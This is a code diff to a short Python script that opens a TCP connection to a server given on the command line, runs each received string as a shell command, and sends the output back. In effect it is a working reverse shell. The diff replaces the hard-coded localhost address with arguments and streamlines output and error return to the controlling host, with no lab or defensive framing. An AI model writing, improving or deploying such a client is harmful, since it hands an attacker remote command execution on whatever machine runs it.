@@ -1,36 +1,46 @@
 import socket
 import subprocess
+import argparse
+import sys
 
 
-def connect(server_ip,server_port):
+def connect(server_ip, server_port):
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    while True:
-        client.connect((server_ip,server_port))
+    try:
+        client.connect((server_ip, server_port))
         while True:
             command = client.recv(1024).decode()
-            try:
-                if command.strip() == "exit":
-                    client.close()
-                    break
-                else:
-                    CMD = subprocess.Popen(
-                        command,
-                        shell=True,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        stdin=subprocess.PIPE,
-                    )
-                    client.send(CMD.stdout.read())
-                    client.send(CMD.stderr.read())
+            if command.strip() == "exit":
+                print("Exiting...")
+                break
 
+            try:
+                # Execute the command and capture the output
+                CMD = subprocess.Popen(
+                    command,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    stdin=subprocess.PIPE,
+                )
+                stdout, stderr = CMD.communicate()
+                # Send the output and error back to the server
+                client.send(stdout + stderr)
             except Exception as e:
-                print("Exception: {}".format(e))
+                print(f"Command execution failed: {e}")
+                client.send(f"Error executing command: {e}".encode())
+    finally:
+        client.close()
 
 
 def main():
-    server_ip="127.0.0.1"
-    server_port=9999
-    connect(server_ip,server_port)
+    parser = argparse.ArgumentParser(description="Remote Command Executor")
+    parser.add_argument('server_ip', type=str, help='IP address of the server to connect to')
+    parser.add_argument('server_port', type=int, help='Port number of the server to connect to')
+
+    args = parser.parse_args()
+
+    connect(args.server_ip, args.server_port)
 
 
 if __name__ == "__main__":
